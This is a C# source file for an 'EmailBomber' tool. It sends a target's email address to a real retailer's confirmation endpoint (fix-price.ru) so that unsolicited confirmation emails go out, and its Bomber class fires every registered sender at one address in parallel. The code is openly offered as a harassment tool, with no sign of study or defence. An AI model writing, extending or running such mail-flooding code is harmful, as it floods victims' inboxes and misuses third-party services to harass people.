using AngleSharp;
using AngleSharp.Dom;
using AngleSharp.Io;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace EmailBomber
{
    interface IEmailSendService
    {
        Task<IDocument> SendEmail(string email);
    }
    abstract class EmailSender : IEmailSendService
    {
        private static string unicodeEncode(string text)
        {
            var rx = new Regex(@"\\u([0-9A-Z]{4})", RegexOptions.Compiled | RegexOptions.IgnoreCase);
            return rx.Replace(text, p => new string((char)int.Parse(p.Groups[1].Value, NumberStyles.HexNumber), 1));
        }
        protected IBrowsingContext context;
        public EmailSender()
        {
            var config = Configuration.Default
                .WithDefaultCookies()
                .WithDefaultLoader();
            context = BrowsingContext.New(config);
        }

        public abstract Task<IDocument> SendEmail(string email);
    }

    class FixPriceSender : EmailSender
    {
        public override async Task<IDocument> SendEmail(string email)
        {
            var dictonary = new Dictionary<string, string>();
            dictonary.Add(@"mail_confirm", "Y");
            dictonary.Add(@"action", "getCode");
            dictonary.Add(@"email", email);
            var documentRequest = DocumentRequest.PostAsUrlencoded(new Url("https://fix-price.ru/ajax/confirm_mail.php"),
                dictonary);
            var result = await context.OpenAsync(documentRequest);
            Console.WriteLine($"=> {result}");
            return result;
        }
    }

    class Bomber
    {
        public string Email { get; set; }
        List<IEmailSendService> emailSendsServices = new List<IEmailSendService>();

        public Bomber(string email)
        {
            Email = email;
        }

        public async Task Bomb()
        {
            var emailSendTasks = emailSendsServices.ConvertAll(m => m.SendEmail(Email));
            await Task.WhenAll(emailSendTasks);
        }

    }
}
